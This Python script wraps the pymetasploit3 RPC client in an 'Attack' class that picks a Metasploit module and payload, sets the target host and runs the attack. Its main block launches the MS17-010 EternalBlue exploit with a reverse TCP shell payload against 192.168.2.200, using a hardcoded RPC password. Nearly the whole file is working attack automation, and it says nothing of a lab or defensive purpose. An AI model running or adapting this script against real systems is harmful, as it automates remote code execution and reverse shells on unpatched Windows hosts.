from pymetasploit3.msfrpc import MsfRpcClient, ExploitModule, PostModule, EncoderModule, AuxiliaryModule, NopModule, \
    PayloadModule

from lib import *


class Attack:
    __rpc: MsfRpcClient
    __rhost: str
    __module_path: Modules
    __payload: Payloads
    __module: ExploitModule | PostModule | EncoderModule | AuxiliaryModule | NopModule | PayloadModule

    def __init__(self,
                 rpc: MsfRpcClient,
                 rhost: str,
                 module: Modules = None,
                 payload: Payloads = None):
        self.__rpc = rpc
        self.__rhost = rhost
        self.__module_path = module
        self.__payload = payload
        print('initialize successful')

    def setModule(self, module: Modules):
        self.__module_path = module

    def setPayload(self, payload: Payloads):
        self.__payload = payload

    def run(self):
        first_slash_index = self.__module_path.value.find('/')
        mtype = self.__module_path.value[:first_slash_index]
        mname = self.__module_path.value[first_slash_index + 1:]
        self.__module = self.__rpc.modules.use(mtype, mname)
        self.__module['RHOSTS'] = self.__rhost
        print(
            self.__rpc.consoles
            .console(self.__rpc.consoles.console().cid)
            .run_module_with_output(self.__module, PayloadModule(self.__rpc, self.__payload.value))
        )



if __name__ == '__main__':
    client = MsfRpcClient("salt", port=55553, ssl=True)

    atk = Attack(client, '192.168.2.200')
    atk.setModule(Modules.MS17_010_ETERNALBLUE)
    atk.setPayload(Payloads.REVERSE_TCP)

    atk.run()
